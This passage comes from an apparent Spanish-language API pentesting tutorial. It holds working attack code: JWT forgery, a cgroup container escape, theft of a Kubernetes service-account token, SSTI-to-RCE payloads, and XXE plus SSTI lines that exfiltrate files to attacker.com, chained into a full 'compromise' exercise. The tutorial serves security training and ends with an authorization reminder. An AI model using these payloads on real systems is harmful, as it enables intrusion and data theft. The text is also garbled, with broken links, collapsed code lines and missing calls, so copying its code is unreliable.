Con ECDSA (ES256), el header "epk" (Ephemeral Public Key) puede ser manipulado.

```json
{ "alg": "ES256", "typ": "JWT", "epk": {"kty": "EC", "crv": "P-256", "x": "..", "y": ".."}
}
```

Si la libreria usa la clave efimera del header en lugar de la clave publica del issuer -> falso positivo de verificacion.

### 8.12 JWT: timestamp manipulation evasion

**Jedi mind trick con iat:**
```python
import jwt, time

# Token emitido "hace un minuto" pero con manipulacion
payload = { "sub": "1", "role": "admin", "iat": int(time.time), "exp": int(time.time) - 1,  # Ya expiro! "nbf": 0
}
# Si el server no valida exp estrictamente..
```

**Leeway abuse:**
Muchas librerias tienen un "leeway" de segundos para exp/iat/nbf. Si el leeway es alto, podes usar tokens viejos.

### 8.13 JWT: cross-service token reuse

Si multiples servicios usan la misma clave JWT pero con diferentes claims:

```python
# Token valido para servicio A (chat)
token_a = jwt.encode({"sub": "user", "role": "moderator", "service": "chat"}, secret)

# Usar token_a en servicio B (admin)
requests.get("https://admin.target.com/api/users", headers={"Authorization": f"Bearer {token_a}"})

# Si servicio B no verifica el claim "service", acepta el token!
```

<a name="microservices-deeper"></a>
### 9.7 [container](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) escape via API

Si tenes ejecucion de codigo en un servicio, podes intentar escapar del container.

```bash
# Probar capabilities
cat /proc/1/status | grep Cap
capsh --print

# Si SYS_ADMIN esta habilitado
mount -t cgroup -o memory cgroup /tmp/cgroup
mkdir /tmp/cgroup/x
echo 1 > /tmp/cgroup/x/notify_on_release
host_path=$(sed -n 's/.*perdir=([^,]*).*/1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgroup/x/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /root/flag > $host_path/flag" >> /cmd
chmod +x /cmd
sh -c "echo $$ > /tmp/cgroup/x/cgroup.procs"
```

### 9.8 [kubernetes](../raw/k8s-d33p-d1v3.md)-d33p-d1v3.md)-d33p service account abuse

Si el servicio tiene un ServiceAccount montado, podes usar sus credenciales.

```bash
# Variables de entorno K8s
env | grep KUBERNETES
env | grep KUBE

# Token del service account
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Autenticarse contra K8s API
K8S_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $K8S_TOKEN" https://kubernetes.default.svc/api/v1/secrets

# Si el SA tiene permisos, podes listar secretos, crear pods, etc.
curl -k -H "Authorization: Bearer $K8S_TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

### 9.9 Sidecar injection bypass

Si el mesh usa sidecar injection por labels, podes crear pods sin sidecar.

```bash
# Crear pod sin sidecar (si tenes acceso a K8s API)
curl -k -H "Authorization: Bearer $K8S_TOKEN" -X POST \ -H "Content-Type: application/json" \ -d '{ "apiVersion": "v1", "kind": "Pod", "metadata": { "name": "attacker-pod", "annotations": { "sidecar.istio.io/inject": "false"  # Sin sidecar! } }, "spec": { "containers": [{ "name": "attacker", "image": "ubuntu:latest", "command": ["sleep", "3600"] }] } }' \ https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

<a name="tools-deeper"></a>
### 10.8 Postman scripts avanzados

**Automatizacion de BOLA con Postman:**
```javascript
// Tests: Verificar BOLA
const usersToTest = [1, 2, 3, 4, 5, 100, 999, 1000];
const baseUrl = pm.environment.get("base_url");
const token = pm.environment.get("token");

usersToTest.forEach(uid => { pm.sendRequest({ url: `${baseUrl}/api/users/${uid}`, method: 'GET', header: { 'Authorization': `Bearer ${token}` } }, (err, res) => { if (res.code === 200) { console.log(`[+] BOLA: User ${uid} accessible`); pm.expect(res.json.id).to.eql(parseInt(pm.variables.get("my_user_id")); } });
});
```

### 10.9 Burp Suite: Intruder para APIs

**[payload](../raw/m3t4spl01t.md#payloads) generation para BOLA:**
```python
# BOLA payload en Burp Intruder (extension custom)
def generate_payloads: for i in range(1, 1001): yield str(i) for uuid_prefix in ["00000000", "11111111", "aaaaaaaa"]: for suffix in ["0000-0000-000000000001", "0000-0000-000000000002"]: yield f"{uuid_prefix}-{suffix}"

# Batching payloads
def batch_payloads: batch = "" for i in range(1, 51): batch += f"u{i}: user(id:{i}) {{ username email password role }} " return f"query {{ {batch} }}"
```

### 10.10 Kiterunner wordlists custom

**Crear wordlist de endpoints desde OpenAPI/Swagger:**
```bash
# Si encontras swagger.json
curl -s https://target.com/swagger.json | python3 -c "
import sys, json
spec = json.load(sys.stdin)
paths = spec.get('paths', {})
for path in paths: print(path) for method in paths[path]: tags = paths[path][method].get('tags', ) for tag in tags: print(f'{method.upper} {path} [{tag}]')
"

# Extraer de JS files
curl -s https://target.com/static/js/main.js | grep -oP '"/api/[^"]*"' | sort -u > api_routes.txt <a name="additional-exercises"></a>
## 13. Ejercicios Adicionales y Desafios

### 13.1 Desafio BOLA avanzado

**Escenario:** Una API de banco tiene este endpoint:
```http
POST /api/transactions/history [http](../raw/r3d3s-f0nd4m3nt0s.md#http)/1.1
Content-Type: application/json
Authorization: Bearer user_token

{"account": "ACC-123456", "from": "2024-01-01", "to": "2024-12-31"}
```

Si cambias ACC-123456 por ACC-789012 y ves transacciones de otra cuenta -> BOLA.

**Preguntas:**
1. Como hariass un script para enumerar cuentas?
2. Que pasa si el parametro account se llama de otra forma? (account_id, acct, numero_cuenta)
3. Como explotarias esto via GraphQL si tambien hay un endpoint /graphql?

**Solucion:**
```python
import requests, json, string

token = "user_token"
base = "https://bank.target.com/api"

# Enumerar cuentas con formato ACC-NNNNNN
for num in range(100000, 999999): acc = f"ACC-{num}" r = requests.post(f"{base}/transactions/history", headers={"Authorization": f"Bearer {token}"}, json={"account": acc, "from": "2020-01-01", "to": "2024-12-31"}) if r.status_code == 200 and "transactions" in r.text: print(f"[+] Account {acc}: {len(r.json['transactions'])} transacciones") with open(f"account_{num}.json", "w") as f: json.dump(r.json, f, indent=2)
```

### 13.2 Desafio GraphQL multiplexado

**Escenario:** Tenes un endpoint GraphQL que limita a 10 alias por query, pero no limita el depth.

**Objetivo:** Extraer todos los usuarios (1000+) minimizando requests.

**Solucion con multiplexado anidado:**
```python
import requests, json

def extract_all_users(url, batch_size=10): all_users = offset = 0 while True: # Usar conexiones paralelas aliases = " ".join([ f'batch_{i}: users(offset: {offset + i * batch_size}, limit: {batch_size}) {{ id username email role }}' for i in range(batch_size) ]) query = f"query {{ {aliases} }}" r = requests.post(url, json={"query": query}) data = r.json.get("data", {}) batch_users = for key, users in data.items: if users: batch_users.extend(users) if not batch_users: break all_users.extend(batch_users) offset += batch_size * batch_size print(f"Extracted {len(all_users)} users so far..") return all_users

users = extract_all_users("https://target.com/graphql")
print(f"Total: {len(users)} users")
```

### 13.3 Desafio gRPC sin reflection

**Escenario:** Encontras un endpoint gRPC en internal-grpc.target.com:8443 con TLS pero SIN reflection. No tenes el .proto file.

**Objetivo:** Descubrir metodos y llamarlos.

**Tecnicas:**
```bash
# 1. Probar metodos comunes de reflection (a veces deshabilitan la lista pero no el metodo)
grpcurl -insecure internal-grpc.target.com:8443 list 2>&1
# Si da error, probar:

# 2. fuerza bruta de nombres de servicio/metodo
grpcurl -insecure internal-grpc.target.com:8443 list UserService 2>&1
grpcurl -insecure internal-grpc.target.com:8443 list AdminService 2>&1
grpcurl -insecure internal-grpc.target.com:8443 list AuthService 2>&1
grpcurl -insecure internal-grpc.target.com:8443 list InternalService 2>&1

# 3. Buscar leaks de .proto en otros endpoints
curl -s https://target.com/proto/ | grep .proto
curl -s https://target.com/docs/ | grep proto
curl -s https://target.com/ | grep ".proto"

# 4. Probar adivinando nombres de campos
grpcurl -insecure -d '{"id": 1}' internal-grpc.target.com:8443 UserService/GetUser 2>&1
grpcurl -insecure -d '{"user_id": 1}' internal-grpc.target.com:8443 UserService/GetUser 2>&1
grpcurl -insecure -d '{"userId": 1}' internal-grpc.target.com:8443 UserService/GetUser 2>&1
grpcurl -insecure -d '{"ID": 1}' internal-grpc.target.com:8443 UserService/GetUser 2>&1

# 5. Analizar errores - a veces revelan la estructura
grpcurl -insecure -d '{}' internal-grpc.target.com:8443 UserService/GetUser 2>&1
# Error puede decir: "expected int32 field 'user_id'"
```

### 13.4 Desafio JWT multi-etapa

**Escenario:** Un sistema con tres servicios que comparten la misma clave JWT pero diferentes estructuras de payload.

**Servicio A (auth)**: Firma JWTs con `{"sub": "user", "role": "user"}`
**Servicio B (admin)**: Verifica JWTs, espera `{"sub": "user", "is_admin": true}`
**Servicio C (api)**: Verifica JWTs, espera `{"sub": "user", "scope": "read write admin"}`

Todos usan la misma clave secreta: "shared_secret"

**Explotacion:**
```python
import jwt

# Como todos los servicios comparten la misma clave:
secret = "shared_secret"  # Obtenido por [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas) o leak

# Token que funciona en Servicio A
token_a = jwt.encode({"sub": "alice", "role": "user"}, secret, algorithm="HS256")

# Token modificado para Servicio B (admin)
token_b = jwt.encode({"sub": "alice", "is_admin": True}, secret, algorithm="HS256")

# Token modificado para Servicio C (full scope)
token_c = jwt.encode({"sub": "alice", "scope": "read write admin"}, secret, algorithm="HS256")

print(f"Token for Service A: {token_a}")
print(f"Token for Service B (admin): {token_b}")
print(f"Token for Service C (admin scope): {token_c}")
```

**Leccion:** Si compartis clave JWT entre servicios, cada servicio debe validar SOLO los claims que le corresponden.

### 13.5 Desafio Mass Assignment en PUT

**Escenario:** Endpoint PUT /api/profile que permite a usuarios actualizar su perfil.

```http
GET /api/profile HTTP/1.1
Authorization: Bearer user_token

Response:
{ "id": 42, "username": "alice", "email": "alice@mail.com", "role": "user", "is_active": true, "balance": 100.00, "referral_code": "ABC123", "created_at": "2024-01-15T10:30:00Z"
}
```

**Objetivo:** Modificar balance, role, o is_active.

```http
PUT /api/profile HTTP/1.1
Authorization: Bearer user_token
Content-Type: application/json

{ "email": "new@mail.com", "role": "admin", "balance": 999999.99, "is_active": true, "referral_code": "HACKER"
}
```

**Solucion:** Probar diferentes combinaciones de campos. Tambien probar:
```json
{"email": "new@mail.com", "role": "admin"}
{"email": "new@mail.com", "balance": 999999.99}
{"email": "new@mail.com", "is_active": true}
{"email": "new@mail.com", "referral_code": "ATTACKER"}
```

Y en GraphQL:
```graphql
mutation { updateProfile(input: { email: "new@mail.com", role: "admin", balance: 999999.99 }) { id role balance }
}
```

### 13.6 Desafio: API Gateway Bypass por protocolo

**Escenario:** El API Gateway solo analiza HTTP/1.1, pero el backend acepta HTTP/2.

**Ataque:** Usar HTTP/2 directo al backend bypassando el gateway.

```bash
# Si el backend esta en internal-api:8080
# y el gateway redirige a el, proba:
curl --http2-prior-knowledge http://internal-api:8080/api/admin/users
# Esto usa HTTP/2 directo, sin pasar por el gateway

# Otra opcion: CONNECT tunnel
curl -x http://gateway:80 -p --http2 https://internal-api:8443/api/admin/users
```

### 13.7 Desafio: Service Mesh mTLS bypass

**Escenario:** Istio service mesh con mTLS strict mode. Encontra un pod que tenga la anotacion:
```
sidecar.istio.io/inject: "false"
```

**Ataque:** Crea un deployment SIN sidecar para acceder a servicios sin mTLS:

```bash
# 1. Buscar namespaces sin injection
kubectl get ns -L istio-injection

# 2. Si hay un namespace sin istio, desplegar ahi
kubectl run attacker --image=ubuntu --restart=Never --namespace=no-istio -- sleep 3600

# 3. Desde ese pod, acceder a servicios sin mtls
kubectl exec -it attacker -n no-istio -- bash
curl http://user-service.default.svc.[cluster](../raw/k8s-d33p-d1v3.md#cluster).local:8080/users
curl http://admin-service.default.svc.cluster.local:9090/admin/users
```

### 13.8 Desafio: Server-Side Template Injection via API

**Escenario:** La API renderiza templates basados en input del usuario.

```http
POST /api/render HTTP/1.1
Content-Type: application/json
{ "template": "Hello {{name}}", "data": {"name": "World"}
}

Response: "Hello World"
```

**Explotacion SSTI:**
```http
POST /api/render HTTP/1.1
Content-Type: application/json
{ "template": "{{7*7}}", "data": {}
}
```
Si responde "49", hay SSTI.

```http
# SSTI en Jinja2 -> rce
POST /api/render HTTP/1.1
Content-Type: application/json
{ "template": "{{ ''.__class__.__mro__[2].__subclasses__ }}", "data": {}
}
```

```http
# Popen para RCE
POST /api/render HTTP/1.1
Content-Type: application/json
{ "template": "{{ config.__class__.__init__.__globals__['os'].popen('id').read }}", "data": {}
}
```

### 13.9 Desafio: XXE via API XML

**Escenario:** La API acepta XML (aunque documente solo JSON).

```http
POST /api/upload HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root> <data>&xxe;</data>
</root>
```

**Variante XXE ciega (out-of-band):**
```http
POST /api/upload HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;
]>
<root> <data>test</data>
</root>
```

En tu server (xxe.dtd):
```xml
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%payload;'>">
%eval;
%exfil;
```

### 13.10 Desafio integrador final

**Escenario completo:** Una plataforma de ecommerce con:
- API REST en api.mercadito.com
- GraphQL en api.mercadito.com/graphql
- gRPC interno en internal-grpc.mercadito.com:8443
- Servicio de admin en admin.mercadito.com
- JWT auth con clave "mercadito_secret_2024"

**Objetivo:** Comprometer todo el sistema.

**Fase 1: Reconocimiento**
```bash
# Enumerar endpoints
for ep in api/v1 api/v2 api/v3 graphql swagger.json .well-known/jwks.json; do curl -s "https://api.mercadito.com/$ep" | head -1
done

# Obtener schema GraphQL
curl -s -X POST https://api.mercadito.com/graphql \ -H "Content-Type: application/json" \ -d '{"query":"{__schema{types{name fields{name type{name kind}}}}}"}'

# Probar introspection en gRPC
grpcurl -insecure internal-grpc.mercadito.com:8443 list
```

**Fase 2: Autenticacion**
```bash
# Registrar usuario
curl -s -X POST https://api.mercadito.com/api/register \ -H "Content-Type: application/json" \ -d '{"username":"hacker","email":"hack@mail.com","password":"Pass123!","role":"admin"}'  # Mass Assignment?

# Login
TOKEN=$(curl -s -X POST https://api.mercadito.com/api/login \ -H "Content-Type: application/json" \ -d '{"username":"hacker","password":"Pass123!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Analizar JWT
python3 jwt_tool.py $TOKEN -T
```

**Fase 3: Explotacion**
```bash
# BOLA - ver otros usuarios
for id in 1 2 3 10 100 1000; do curl -s -H "Authorization: Bearer $TOKEN" "https://api.mercadito.com/api/users/$id"
done

# BFLA - endpoint admin
curl -s -H "Authorization: Bearer $TOKEN" https://api.mercadito.com/api/admin/users

# GraphQL batching
curl -s -X POST https://api.mercadito.com/graphql \ -H "Content-Type: application/json" \ -d '{"query":"{ u1: user(id:1){email password} u2: user(id:2){email password} u3: user(id:3){email password} }"}'

# JWT - forjar token admin
python3 jwt_tool.py $TOKEN -S hs256 -k "mercadito_secret_2024" -pc role -pv admin

# gRPC - enumerar servicios internos
grpcurl -insecure -H "Authorization: Bearer $FORGED_TOKEN" \ internal-grpc.mercadito.com:8443 list

grpcurl -insecure -H "Authorization: Bearer $FORGED_TOKEN" \ -d '{"user_id": 1}' \ internal-grpc.mercadito.com:8443 admin.AdminService/ImpersonateUser
```

**Fase 4: Post-explotacion**
```bash
# Extraer datos masivos
curl -s "https://api.mercadito.com/api/users?limit=1000000" > all_users.json

# Buscar secretos en respuestas
grep -oP '"secret":"[^"]*"' all_users.json
grep -oP '"password":"[^"]*"' all_users.json
grep -oP '"flag":"[^"]*"' all_users.json

# Si hay RCE via SSTI, ejecutar comandos
curl -s -X POST https://api.mercadito.com/api/render \ -H "Content-Type: application/json" \ -d '{"template":"{{ config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20/etc/passwd%27).read }}","data":{}}'

# Exfiltrar datos
curl -s -X POST https://api.mercadito.com/api/render \ -H "Content-Type: application/json" \ -d '{"template":"{{ request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27curl%20http://attacker.com/%3fdata=$(cat%20/etc/flag)%27).read }}","data":{}}'
```

**Reporte final:**
```
=== [reporte de pentest](../raw/p3nt3st-r3p0rt1ng.md) ===
Cliente: Mercadito S.A.
Fecha: 2024-01-15
Severidad: CRITICA

Hallazgos:
1. BOLA en /api/users/{id} (CRITICAL) - Cualquier usuario autenticado puede ver perfiles de otros usuarios
2. BFLA en /api/admin/* (CRITICAL) - Usuarios normales pueden acceder a endpoints de administracion
3. Mass Assignment en /api/register (HIGH) - Se puede registrar como admin
4. JWT secret debil (CRITICAL) - Se crackea en 2 segundos, permite forjar tokens
5. GraphQL introspection (MEDIUM) - Schema completo expuesto sin autenticacion
6. GraphQL expone passwords (HIGH) - Campo password accesible via GraphQL
7. gRPC reflection habilitada (MEDIUM) - Enumeration de servicios internos
8. SSTI en /api/render (CRITICAL) - [rce](../raw/w3b-h4ck1ng.md#rce) completo en servidor
9. No [rate limiting](../raw/4p1-s3cur1ty.md#rate-limiting) (MEDIUM) - [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta) y scraping posible
10. Verbose errors (LOW) - Stack traces expuestos

Impacto: Compromiso total del sistema, acceso a datos de todos los usuarios,
ejecucion de codigo en servidores, y potencial movimiento lateral a otros sistemas.

Recomendaciones:
1. Implementar autorizacion en TODOS los endpoints
2. NO confiar en el JWT payload del cliente
3. Deshabilitar introspection en produccion
4. Usar secrets fuertes para JWT (>256 bits)
5. Rate limiting en todos los endpoints
6. [input validation](../raw/s3c-f0nd4m3nt0s.md#validacion-de-entrada) estricto
7. Deshabilitar debug/verbose errors
8. Revision de seguridad en el [pipeline](../raw/c1cd-h4ck1ng.md#pipeline) [ci/cd](../raw/c1cd-h4ck1ng.md)
```

---

**Fin del tutorial 4P1-S3Cur1ty: API Hacking y Microservicios**

### 13.11 Bonus: Checklist rapido para pentest de APIs

Usa esta checklist durante tus pentests:

```markdown
# Checklist de API Pentesting

## [reconocimiento](../raw/0s1nt.md#reconocimiento)](
-  Descubrir todos los endpoints (Kiterunner, wordlists)
-  Identificar metodos [http](../raw/r3d3s-f0nd4m3nt0s.md#http) permitidos (OPTIONS)
-  Obtener schema (OpenAPI,  introspection)
-  Descubrir versiones de API (v1, v2, v3)

## autenticacionc
-  Probar credenciales por defecto
-  [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta) en login (sin [rate limiting](../raw/4p1-s3cur1ty.md#rate-limiting)?)
-  [jwt](../raw/4p1-s3cur1ty.md#jwt): decodificar y analizar claims
-  JWT: probar algorithm confusion (RS256 -> HS256)
-  JWT: probar none algorithm
-  JWT: crackear secreto debil
-  JWT: kid injection
-  JWT: jku injection
-  Probar token sin expiracion
-  Probar token reutilizacion entre servicios

## au[torizacion](./raw/s3c ([bola](../raw/4p1-s3cur1ty.md#bola))
-  Probar IDOR en idss](./raw/s3c) numericos (/users/1, /users/2)
-  Probar IDOR en UUIDs
-  Probar IDOR en parametros de body
-  Probar IDOR en headers/cookies
-  Probar IDOR en WebSockets
-  Probar IDOR en [graphql](../raw/4p1-s3cur1ty.md#graphql) queries
-  Probar IDOR en GraphQL mutations
-  Enumeracion masiva via batching

## au[torizacion](./raw/s3c (BFLA)
-  Probar endpoints admin sin privilegios
-  Probar [http](../raw/r3d3s-f0nd4m3nt0s.md#http) method tampering
-  Probar method override headers
-  Probar forced browsing de endpoints
-  Probar race conditions en [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion)

## Mass Assignment
-  Probar campos sensibles en POST (role, is_admin)
-  Probar campos sensibles en PUT/PATCH
-  Probar JSON parameter pollution
-  Probar [http](../raw/r3d3s-f0nd4m3nt0s.md#http) parameter pollution

## 
-  Testear introspection
-  Extraer schema completo
-  Probar batching para [bola](../raw/4p1-s3cur1ty.md#bola)
-  Probar batching para [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta)
-  Probar depth-based DoS
-  Probar SQL/Nosql injection via [graphql](../raw/4p1-s3cur1ty.md#graphql)

## grpc
-  Testear reflection API
-  Enumerar servicios y metodos
-  Invocar metodos sin auth
-  Probar metadata spoofing
-  Buscar archivos .proto

## otras vulnerabilidadces
-  [ssrf](../raw/w3b-h4ck1ng.md#ssrf) en endpoints que fetch URLs
-  SSTI en endpoints que renderizan
-  XXE si aceptan XML
-  Verbose errors
-  Debug endpoints (actuator, .env)
-  CORS mal configurado
-  [rate limiting](../raw/4p1-s3cur1ty.md#rate-limiting) ausente
-  Pagination sin limite
-  Upload sin restriccion de tamano

## Microservicios
-  Buscar service registry (Consul, Eureka, etcd)
-  Probar acceso directo a servicios internos
-  Enumerar endpoints de service mesh (Envoy admin)
-  Probar [k8s](../raw/k8s-d33p-d1v3.md) API desde pods
-  Buscar service account tokens montados
```

### 13.12 Recursos de aprendizaje continuo

**Canales de YouTube:**
- STÖK (apihacking, bug bounty)
- The Cyber Mentor (pentesting general)
- InsiderPhD (API hacking, GraphQL)
- Farah Hawa (API security)
- IppSec (HTB walkthroughs con APIs)

**Libros:**
- "Hacking APIs: Breaking Web Application Programming Interfaces" - Corey Ball
- "API Security in Action" - Neil Madden
- "The Web Application Hacker's Handbook" - Stuttard & Pinto
- "OWASP Testing Guide v4" - OWASP

**Blogs:**
- PortSwigger Research: https://portswigger.net/research
- Assetnote: https://assetnote.io/resources/
- Detectify Blog: https://blog.detectify.com/
- OWASP API Security Project: https://owasp.org/www-project-api-security/

**Laboratorios online:**
- https://portswigger.net/web-security/all-labs (API labs)
- https://www.root-me.org/ (Rusty Vuln API, GraphQL)
- https://www.hackthebox.com/ (maquinas con APIs)
- https://pentesterlab.com/ (API Security track)

**Herramientas recomendadas:**
Burp Suite Pro + Autorize + InQL + JSON Web Tokens extension
Postman + Newman (automatizacion)
Kiterunner + Arjun (discovery)
jwt_tool + hashcat (JWT attacks)
graphqlmap + InQL (GraphQL)
grpcurl + grpcui (gRPC)
nuclei + httpx (automatizacion)

---

*Recorda: el objetivo del pentesting es mejorar la seguridad. Reporta responsablemente,
documenta tus hallazgos, y jamas explotes vulnerabilidades sin autorizacion explicita.*

---

**Fin del tutorial 4P1-S3Cur1ty - Creado por el equipo de Forense**

